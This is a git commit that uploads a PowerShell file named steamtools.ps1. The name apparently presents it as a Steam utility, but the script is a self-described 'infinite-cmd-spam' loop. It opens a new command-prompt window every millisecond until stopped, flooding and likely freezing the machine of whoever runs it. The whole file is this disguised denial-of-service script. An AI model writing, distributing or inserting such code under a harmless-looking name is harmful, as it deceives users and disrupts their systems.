3e6b366047858df2b2eff1113ab3121a6038058d
zta2 <srsazam@gmail.com>
2026-01-18 01:40:55 +0300

    Add files via upload

---
+++ steamtools.ps1
@@ -0,0 +1,13 @@
+# infinite-cmd-spam.ps1
+
+Write-Host "Infinite CMD windows incoming... Press Ctrl+C to stop" -ForegroundColor Yellow
+
+try {
+    while ($true) {
+        Start-Process cmd
+        Start-Sleep -Milliseconds 1      # ← prevents instant CPU death
+    }
+}
+finally {
+    Write-Host "Stopped." -ForegroundColor Green
+}
